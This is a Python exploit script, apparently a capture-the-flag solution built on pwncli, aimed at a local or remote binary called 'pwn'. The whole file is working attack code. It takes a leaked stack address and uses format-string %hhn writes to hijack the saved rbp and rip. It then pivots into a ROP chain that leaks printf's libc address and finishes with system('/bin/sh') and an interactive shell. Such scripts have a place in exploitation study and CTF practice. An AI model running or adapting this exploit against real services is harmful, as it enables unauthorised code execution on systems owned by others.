#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

ru(b"Enter your string into my buffer, located at 0x")
leak_addr = int(ru(b": ", drop=True), 16)
lg("leak_addr")
assert leak_addr&0xff == 0x90           #   for the convience of calculation of the fake rbp
last_rip_addr = leak_addr + 0x118
last_rbp_addr = leak_addr + 0x110
lg("last_rbp_addr")
lg("last_rip_addr")

pop_rdi_ret = 0x0000000000401373
ret_addr    = pop_rdi_ret + 1

debugB()

payload = b"%46c"
#  actually, the padding length should be 46*2-4, and the len(previous_payload)==4, so here we directly use 46*2==0x58
payload = payload.ljust(0x58, b"\x00")  #   hijack rbp to controllable address
payload += b"%29$hhn"
payload = payload.ljust(0xad, b"a")     #   set rip to gadget "leave; ret;"
payload += b"%30$hhn"
payload = payload.ljust(0xc0, b"a")
payload += p64(last_rbp_addr)
payload += p64(last_rip_addr)
payload += p64(pop_rdi_ret)
payload += p64(elf.got['printf'])
payload += p64(elf.plt['printf'])
payload += p64(ret_addr)
payload += p64(elf.sym['main'])
sl(payload)

libc_base = u64_ex(rn(6)) - libc.sym.printf
lg("libc_base")

ru(b"Enter your string into my buffer, located at 0x")
leak_addr = int(ru(b": ", drop=True), 16)
lg("leak_addr")
last_rip_addr = leak_addr + 0x118
last_rbp_addr = leak_addr + 0x110
lg("last_rbp_addr")
lg("last_rip_addr")

#  now that we've got libc base, it's quite easy to repeat the above code
payload = b"%22c"
payload = payload.ljust(0x28, b"\x00")  #   hijack rbp to controllable address
payload += b"%29$hhn"
payload = payload.ljust(0xad, b"a")     #   set rip to gadget "leave; ret;"
payload += b"%30$hhn"
payload = payload.ljust(0xc0, b"a")
payload += p64(last_rbp_addr)
payload += p64(last_rip_addr)
payload += p64(pop_rdi_ret)
payload += p64(libc_base + next(libc.search(b"/bin/sh\x00")))
payload += p64(libc_base + libc.sym.system)
sl(payload)


ia()
